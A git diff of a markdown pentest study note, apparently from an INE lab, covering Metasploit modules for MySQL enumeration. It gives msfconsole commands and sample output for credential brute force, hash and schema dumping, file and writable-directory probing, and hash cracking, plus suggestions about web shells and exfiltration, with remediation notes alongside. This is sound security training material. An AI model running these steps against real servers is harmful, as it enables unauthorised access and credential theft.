@@ -1,400 +1,423 @@
-# 🐬 Metasploit - MySQL Enumeration Modules
+# Metasploit - MySQL Enumeration Modules (Detailed)
 
-This file explains useful **Metasploit auxiliary modules** for MySQL service enumeration.  
+## Purpose
+Detailed notes for Metasploit auxiliary modules used to enumerate MySQL services.  
+Use this file to detect version, find credentials, enumerate users/databases, dump hashes and schemas, and check writable directories.
 
----
-
-## 🎯 Purpose
-
-These modules help you:
-- Detect MySQL server version  
-- Brute-force MySQL credentials  
-- Enumerate users, databases, and privileges  
-- Dump password hashes  
-- Find writable directories and files  
-
----
-
-## 🗂️ MySQL Enumeration Modules Summary
-
-| #  | Module              | What it Does                           |
-|----|---------------------|----------------------------------------|
-| 1  | mysql_version       | Detect MySQL server version            |
-| 2  | mysql_login         | Brute-force login credentials          |
-| 3  | mysql_enum          | Enumerate databases, users, privileges |
-| 4  | mysql_sql           | Run custom SQL queries                 |
-| 5  | mysql_file_enum     | Check for existence of files/directories |
-| 6  | mysql_hashdump      | Dump password hashes                   |
-| 7  | mysql_schemadump    | Dump database schema                   |
-| 8  | mysql_writable_dirs | Check for writable directories         |
+## Key modules / usage
+- `auxiliary/scanner/mysql/mysql_version` — detect MySQL server version.
+- `auxiliary/scanner/mysql/mysql_login` — brute-force MySQL credentials.
+- `auxiliary/admin/mysql/mysql_enum` — enumerate databases, users, privileges.
+- `auxiliary/admin/mysql/mysql_sql` — run custom SQL queries.
+- `auxiliary/scanner/mysql/mysql_file_enum` — check for files and directories.
+- `auxiliary/admin/mysql/mysql_hashdump` — dump MySQL password hashes.
+- `auxiliary/admin/mysql/mysql_schemadump` — dump database schema.
+- `auxiliary/scanner/mysql/mysql_writable_dirs` — check for writable directories.
 
 ---
 
-## 1️⃣ Detect MySQL Version
+## Quick examples
+Short commands to run in `msfconsole`.
 
-**Module**
 ```bash
-auxiliary/scanner/mysql/mysql_version
-```
+# Start msfconsole
+msfconsole -q
 
-**Command**
-```bash
+# Detect version
 use auxiliary/scanner/mysql/mysql_version
 set RHOSTS demo.ine.local
 run
-```
 
-📸 **Sample Output:**
-```
-[+] 192.162.117.3:3306 - 192.162.117.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
-[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-```
-
-🔍 **Interpretation:**
-- MySQL version detected: **5.5.61 on Ubuntu**  
-- Attackers can search for **known exploits** related to this version  
-- Defenders should ensure old versions are patched or upgraded  
-
-### 📂 Next Step: Search for Exploits  
-Once the version is known, you can look for vulnerabilities:  
-```bash
-searchsploit mysql 5.5.61
-```  
-
-- `searchsploit` searches Exploit-DB for public exploits.  
-- Attackers may find privilege escalation or RCE exploits targeting this version.  
-
----
-
-## 2️⃣ MySQL Login Bruteforce
-
-**Module**
-```bash
-auxiliary/scanner/mysql/mysql_login
-```
-
-**Command**
-```bash
+# Brute-force login
 use auxiliary/scanner/mysql/mysql_login
 set RHOSTS demo.ine.local
 set USERNAME root
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-set VERBOSE false
+set PASS_FILE /path/to/passwords.txt
+run
+
+# Enumerate with credentials
+use auxiliary/admin/mysql/mysql_enum
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+run
+
+# Dump hashes
+use auxiliary/admin/mysql/mysql_hashdump
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
 run
 ```
 
-📸 **Sample Output:**
-```
-[+] 192.162.117.3:3306    - 192.162.117.3:3306 - Success: 'root:twinkle'
-[*] demo.ine.local:3306   - Scanned 1 of 1 hosts (100% complete)
-[*] demo.ine.local:3306   - Bruteforce completed, 1 credential was successful.
-[*] demo.ine.local:3306   - You can open an MySQL session with these credentials and CreateSession set to true
-[*] Auxiliary module execution completed
-```
+---
 
-🔍 **Interpretation:**
-- Found valid credentials: `root:twinkle`  
-- This gives **full control** over the database  
-- Weak or default credentials are a **critical security risk**  
-
-### 📂 Next Step: Open a MySQL Session  
-After finding valid credentials, you can open a MySQL session:  
-```bash
-mysql -h demo.ine.local -u root -p
-```
-Enter the password (`twinkle`) when prompted.  
-
-- If login succeeds, you now have direct access to the database.  
-- From here, you can run queries like `SHOW DATABASES;` or `SELECT * FROM users;`.   
+## How to read common output
+- `MySQL <version>` — detected server version. Use to check CVEs.
+- `Login Successful` or `Success` — valid credentials found.
+- `Found /path` or `is a directory` — file/directory existence.
+- `Saving HashString as Loot` — hashes saved to loot for offline cracking.
+- `Schema stored in: /root/.msf4/loot/...` — schema dump saved.
 
 ---
 
-## 3️⃣ MySQL Enum
+## Practical tips
+- Run `mysql_version` first. Map version to advisories before aggressive actions.
+- Use targeted wordlists for login brute force. Avoid high-rate brute-force on production.
+- Prefer `mysql_enum` to gather users and privileges rather than blind SQL queries.
+- Save all loot files and console logs. Collect timestamps and module options used.
+- Do not run destructive queries unless in a lab. Follow legal and ethical rules.
+
+---
+
+# Module details (expanded)
+
+## mysql_version — Detect MySQL server version
 
 **Module**
-```bash
+```
+auxiliary/scanner/mysql/mysql_version
+```
+
+**Purpose (short)**
+Retrieve server version and protocol info.
+
+**Important options**
+- `RHOSTS`, `RPORT` (default 3306), `THREADS`.
+
+**What it does**
+- Connects to MySQL socket and reads server greeting and version.
+
+**Typical output**
+```
+[+] 192.0.2.3:3306 - MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
+```
+
+**Interpretation**
+- Use version to search for vendor advisories and CVEs.
+- Older versions often have known privilege escalation or RCE vulnerabilities.
+
+**Follow-ups**
+- Run `searchsploit mysql <version>` or check NVD/CVE.
+- Plan next steps based on version (patching vs exploit testing in lab).
+
+**Remediation**
+- Upgrade MySQL to supported versions and apply vendor patches.
+
+---
+
+## mysql_login — Brute-force MySQL credentials
+
+**Module**
+```
+auxiliary/scanner/mysql/mysql_login
+```
+
+**Purpose (short)**
+Attempt authentication with username/password lists.
+
+**Important options**
+- `RHOSTS`, `USERNAME` (optional), `PASS_FILE`, `USERPASS_FILE`, `THREADS`, `VERBOSE`, `STOP_ON_SUCCESS`.
+
+**What it does**
+- Tries credentials and reports success.
+
+**Typical output**
+```
+[+] 192.0.2.3:3306 - Success: 'root:twinkle'
+```
+
+**Interpretation**
+- Found valid credential. Access level depends on account privileges.
+
+**Cautions**
+- Brute force triggers IDS or account lockouts. Use slow rates in real environments.
+
+**Follow-ups**
+- Open a MySQL client with found credentials and inspect databases.
+
+**Remediation**
+- Enforce strong passwords, lockout policies, and monitor failed attempts.
+
+---
+
+## mysql_enum — Enumerate databases, users, privileges
+
+**Module**
+```
 auxiliary/admin/mysql/mysql_enum
 ```
 
-**Command**
-```bash
-use auxiliary/admin/mysql/mysql_enum
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-run
+**Purpose (short)**
+Collect server metadata, users, privileges, and some configuration settings.
+
+**Important options**
+- `RHOSTS`, `USERNAME`, `PASSWORD`, `VERBOSE`.
+
+**What it does**
+- Runs queries to list users, grants, databases, variables, and other server info.
+
+**Typical output**
+```
+[+] User: root Host: localhost Password Hash: *A0E23...
+[+] MySQL Version: 5.5.61...
 ```
 
-📸 **Sample Output:** (truncated)
-```
-[*] 192.162.117.3:3306 - Running MySQL Enumerator...
-[*] 192.162.117.3:3306 - Enumerating Parameters
-[*] 192.162.117.3:3306 -        MySQL Version: 5.5.61-0ubuntu0.14.04.1
-[*] 192.162.117.3:3306 -        Compiled for the following OS: debian-linux-gnu
-[*] 192.162.117.3:3306 -        Architecture: x86_64
-...
-[+] 192.162.117.3:3306 -                User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
-[+] 192.162.117.3:3306 -                User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
-[+] 192.162.117.3:3306 -                User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
-...
-```
+**Interpretation**
+- Reveals user accounts, hashes, and privileges. Identify high-privilege accounts.
 
-🔍 **Interpretation:**
-- Lists MySQL users, privileges, and password hashes  
-- Shows server parameters (OS, architecture, logging, SSL, etc.)  
-- If **SSL Connection** is disabled, all MySQL traffic (queries, usernames, passwords) is sent in **cleartext** and can be sniffed on the network  
-- If **Logging is disabled**, malicious activity may go undetected  
-- Attackers use this info to identify misconfigurations and privilege escalation paths  
+**Follow-ups**
+- Check `SHOW GRANTS FOR 'user'@'host';` for privilege details.
+- Note accounts with `SUPER`, `GRANT OPTION`, or `FILE` privileges.
 
-### 📂 Next Step: Use Enum Results  
-After enumeration, you can:  
-```sql
--- Check current user privileges
-SHOW GRANTS FOR 'root'@'localhost';
-
--- List all MySQL users
-SELECT user, host FROM mysql.user;
-
--- Identify accounts with SUPER privilege
-SELECT user, host FROM mysql.user WHERE Super_priv='Y';
-```  
-
-- Privileges like **SUPER** or **GRANT OPTION** give high control.  
-- Attackers look for accounts with weak or excessive privileges. 
+**Remediation**
+- Remove or restrict unnecessary privileges. Use least privilege model.
 
 ---
 
-## 4️⃣ Run Custom SQL Queries
+## mysql_sql — Run custom SQL queries
 
 **Module**
-```bash
+```
 auxiliary/admin/mysql/mysql_sql
 ```
 
-**Command**
-```bash
-use auxiliary/admin/mysql/mysql_sql
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-run
+**Purpose (short)**
+Execute arbitrary SQL statements via Metasploit module.
+
+**Important options**
+- `RHOSTS`, `USERNAME`, `PASSWORD`, `STATEMENT` (if supported).
+
+**What it does**
+- Sends provided SQL to the server and prints results.
+
+**Typical output**
+```
+[*] Sending statement: 'select version()'...
+[*]  | 5.5.61-0ubuntu0.14.04.1 |
 ```
 
-📸 **Sample Output:**
-```
-[*] 192.162.117.3:3306 - Sending statement: 'select version()'...
-[*] 192.162.117.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
-[*] Auxiliary module execution completed
-```
+**Interpretation**
+- Use for targeted data extraction or verification.
 
-🔍 **Interpretation:**
-- Allows execution of **custom SQL queries**  
-- Attackers can extract sensitive data directly  
-- Defenders should enforce **least privilege** and avoid using root accounts for applications  
+**Cautions**
+- Dangerous if used to modify data. Prefer read-only queries unless in lab.
 
-### 📂 Useful SQL Commands  
-Once authenticated, you can run custom queries such as:  
-```sql
-SHOW DATABASES;
-SHOW TABLES;
-SELECT * FROM users LIMIT 5;
-```  
+**Follow-ups**
+- Use `SHOW DATABASES;`, `SELECT ...` to inspect data. Export sensitive rows to loot files.
 
-- `SHOW DATABASES;` → Lists all databases.  
-- `SHOW TABLES;` → Lists tables inside the current database.  
-- `SELECT * FROM users;` → Dumps data from the `users` table (could expose usernames and passwords).  
+**Remediation**
+- Limit account permissions for automated or application accounts.
 
 ---
 
-## 5️⃣ MySQL File Enumeration
+## mysql_file_enum — Check for files and directories
 
 **Module**
-```bash
+```
 auxiliary/scanner/mysql/mysql_file_enum
 ```
 
-**Command**
-```bash
-use auxiliary/scanner/mysql/mysql_file_enum
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
-set VERBOSE true
-run
+**Purpose (short)**
+Test for presence of common files and directories on the host filesystem accessible via SQL functions.
+
+**Important options**
+- `FILE_LIST` — wordlist of paths, `VERBOSE`, `RHOSTS`, `USERNAME`, `PASSWORD`.
+
+**What it does**
+- Uses SQL functions or file-related features to check if paths exist.
+
+**Typical output**
+```
+[+] /tmp is a directory and exists
+[+] /etc/passwd is a file and exists
+[!] /etc/shadow does not exist
 ```
 
-📸 **Sample Output:** (truncated)
-```
-[+] 192.162.117.3:3306 - /tmp is a directory and exists
-[+] 192.162.117.3:3306 - /etc/passwd is a file and exists
-[!] 192.162.117.3:3306 - /etc/shadow does not exist
-[+] 192.162.117.3:3306 - /root is a directory and exists
-[+] 192.162.117.3:3306 - /home is a directory and exists
-...
-```
+**Interpretation**
+- Finding system files indicates high risk. Presence of `/etc/passwd` is normal; access to `/etc/shadow` is critical.
 
-🔍 **Interpretation:**
-- Confirms existence of sensitive files like `/etc/passwd`  
-- If `/etc/shadow` or `/root` are accessible, this is a **severe security issue**  
-- Attackers can plan **privilege escalation** using exposed files  
+**Follow-ups**
+- If readable, download or copy file contents to review in safe environment.
 
-### 📂 How to Verify Files  
-Once a file is discovered, you can try to read it directly if permissions allow:  
-```bash
-cat /etc/passwd
-less /etc/passwd
-grep root /etc/passwd
-```
-
-- `/etc/passwd` lists system users.  
-- `/etc/shadow` (if accessible) contains password hashes.  
-- `/root` directory access could expose sensitive configuration or private keys.
+**Remediation**
+- Restrict MySQL process permissions. Ensure file access via DB is limited.
 
 ---
 
-## 6️⃣ Dump MySQL Password Hashes
+## mysql_hashdump — Dump MySQL password hashes
 
 **Module**
-```bash
-auxiliary/scanner/mysql/mysql_hashdump
+```
+auxiliary/admin/mysql/mysql_hashdump
 ```
 
-**Command**
-```bash
-use auxiliary/scanner/mysql/mysql_hashdump
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-run
+**Purpose (short)**
+Extract password hash strings from the mysql.user table and save as loot.
+
+**Important options**
+- `RHOSTS`, `USERNAME`, `PASSWORD`, `OUTPUT` (loot path).
+
+**What it does**
+- Queries mysql.user for authentication strings and stores them.
+
+**Typical output**
+```
+[+] Saving HashString as Loot: root:*A0E23B...
 ```
 
-📸 **Sample Output:**
-```
-[+] 192.162.117.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
-[+] 192.162.117.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
-[+] 192.162.117.3:3306 - Saving HashString as Loot: ultra:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
-[+] 192.162.117.3:3306 - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
-...
-```
+**Interpretation**
+- Collected hashes can be cracked offline to reveal plaintext passwords.
 
-🔍 **Interpretation:**
-- Dumps all password hashes from MySQL user table  
-- Hashes are stored instead of plaintext passwords in the MySQL `mysql.user` table  
-- Attackers can crack these hashes offline using tools like **John the Ripper** or **Hashcat**  
-- If cracked, attackers recover the **real plaintext password**  
-- Recovered credentials may be reused across other services if password reuse exists  
+**Follow-ups**
+- Run cracking tools like John or Hashcat locally on hash files.
 
-### 🔑 Cracking Examples  
-
-**Using John the Ripper**  
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-john --show hashes.txt
-```  
-
-**Using Hashcat**  
-```bash
-hashcat -m 300 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 300 --show hashes.txt
-``` 
+**Remediation**
+- Use modern password hashing and rotate passwords. Limit DB access to trusted admins.
 
 ---
 
-## 7️⃣ Dump Database Schema
+## mysql_schemadump — Dump database schema
 
 **Module**
-```bash
-auxiliary/scanner/mysql/mysql_schemadump
+```
+auxiliary/admin/mysql/mysql_schemadump
 ```
 
-**Command**
-```bash
-use auxiliary/scanner/mysql/mysql_schemadump
-set USERNAME root
-set PASSWORD twinkle
-set RHOSTS demo.ine.local
-run
+**Purpose (short)**
+Extract database schema structure and save to loot.
+
+**Important options**
+- `RHOSTS`, `USERNAME`, `PASSWORD`, `OUTPUT`.
+
+**What it does**
+- Iterates databases and tables and saves schema information.
+
+**Typical output**
+```
+[+] Schema stored in: /root/.msf4/loot/..._mysql_schema_680841.txt
 ```
 
-📸 **Sample Output:**
-```
-[+] 192.162.117.3:3306 - Schema stored in: /root/.msf4/loot/20250914223702_default_192.162.117.3_mysql_schema_680841.txt
-[+] 192.162.117.3:3306 - MySQL Server Schema 
- Host: 192.162.117.3 
- Port: 3306 
- ====================
+**Interpretation**
+- Schema shows where data lives. Useful to plan data-targeted extraction.
 
----
-- DBName: upload
-  Tables: []
-- DBName: vendors
-  Tables: []
-- DBName: videos
-  Tables: []
-- DBName: warehouse
-  Tables: []
-```
+**Follow-ups**
+- Inspect loot file to find sensitive table names and plan safe data checks.
 
-🔍 **Interpretation:**
-- Dumps schema (structure) of all databases, including database names and tables  
-- Does not return actual data, but shows the map of where data is stored  
-- Helps attackers identify potential data storage locations (e.g., `users`, `credit_cards`, `customers`)  
-- Defenders should restrict schema access to prevent reconnaissance of sensitive databases  
-
-### 📂 How to View Schema Loot File  
-After running this module, the schema is saved in a loot file (e.g., `/root/.msf4/loot/<filename>`).  
-
-You can view it with:  
-```bash
-cat /root/.msf4/loot/20250914223702_default_192.162.117.3_mysql_schema_680841.txt
-```
-Or:  
-```bash
-less /root/.msf4/loot/20250914223702_default_192.162.117.3_mysql_schema_680841.txt
-```
+**Remediation**
+- Limit schema visibility, avoid giving read access to `mysql` schema for apps.
 
 ---
 
-## 8️⃣ Writable Directories Check
+## mysql_writable_dirs — Check for writable directories
 
 **Module**
-```bash
+```
 auxiliary/scanner/mysql/mysql_writable_dirs
 ```
 
-**Command**
+**Purpose (short)**
+Identify directories where MySQL process can write files.
+
+**Important options**
+- `DIR_LIST`, `RHOSTS`, `USERNAME`, `PASSWORD`.
+
+**What it does**
+- Attempts to create files in candidate directories and reports success/failure.
+
+**Typical output**
+```
+[+] /tmp is writeable
+[!] Can't create/write to file '/etc/passwd/LzuBWjIb' (Errcode: 20)
+```
+
+**Interpretation**
+- Writable directories can be used for persistence, file upload, or privilege escalation.
+
+**Follow-ups**
+- If writable and in webroot, consider uploading web shells only in lab environment.
+- Use writable dirs to exfiltrate data to a place attacker controls if allowed.
+
+**Remediation**
+- Restrict MySQL user privileges on filesystem. Run MySQL with least privileges.
+
+---
+
+## INE lab example (complete scenario)
+
+### Input
 ```bash
+# Detect version
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS demo.ine.local
+run
+
+# Brute-force login
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/unix_passwords.txt
+run
+
+# Enumerate server
+use auxiliary/admin/mysql/mysql_enum
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+run
+
+# Check files and writable dirs
+use auxiliary/scanner/mysql/mysql_file_enum
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+set FILE_LIST /usr/share/wordlists/directory.txt
+run
+
 use auxiliary/scanner/mysql/mysql_writable_dirs
 set RHOSTS demo.ine.local
 set USERNAME root
 set PASSWORD twinkle
-set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set DIR_LIST /usr/share/wordlists/directory.txt
+run
+
+# Dump hashes and schema
+use auxiliary/admin/mysql/mysql_hashdump
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+run
+
+use auxiliary/admin/mysql/mysql_schemadump
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
 run
 ```
 
-📸 **Sample Output:**
+### Output (aggregated example)
 ```
-[*] 192.162.117.3:3306 - Checking /tmp...
-[+] 192.162.117.3:3306 - /tmp is writeable
-[*] 192.162.117.3:3306 - Checking /root...
-[+] 192.162.117.3:3306 - /root is writeable
-[!] 192.162.117.3:3306 - Can't create/write to file '/etc/passwd/LzuBWjIb' (Errcode: 20)
-...
+[+] 192.162.117.3:3306 - MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
+[+] 192.162.117.3:3306 - Success: 'root:twinkle'
+[+] User: root Host: localhost Password Hash: *A0E23B...
+[+] /etc/passwd is a file and exists
+[+] /tmp is writeable
+[+] Saving HashString as Loot: root:*A0E23B...
+[+] Schema stored in: /root/.msf4/loot/..._mysql_schema_680841.txt
 ```
 
-🔍 **Interpretation:**
-- Identifies writable directories on the target. 
-- Writable directories can be abused by attackers to upload or store files.  
-- This is a critical finding because it can lead to persistence or privilege escalation.  
+### Short analysis and next steps
+- Version 5.5.61 is old. Check for CVEs and apply patches.
+- Found `root:twinkle`. Use this credential to inspect databases and dump sensitive tables.
+- `/etc/passwd` found. If `/etc/shadow` accessible, escalate and extract hashes.
+- Writable `/tmp` can be abused for persistence. If webroot writable, test web shell only in lab.
+- Hashes saved to loot. Crack offline with John/Hashcat and report findings.
 
-### 📂 How to Test Writable Directories  
-If a directory is marked as writable, you can try creating a test file:  
-```bash
-echo "test123" > /tmp/test.txt
-cat /tmp/test.txt
-```  
+---
 
-- If the file is created successfully → directory is confirmed writable.  
-- Attackers could use writable directories for persistence (scripts, cron jobs) or privilege escalation.  
+## Final checklist (report)
+- [ ] Save raw module outputs and timestamps.
+- [ ] Collect loot files and compute hashes for evidence.
+- [ ] Note exact commands and wordlists used.
+- [ ] Recommend remediation for each finding.
+- [ ] Provide safe reproduction steps for reviewers.
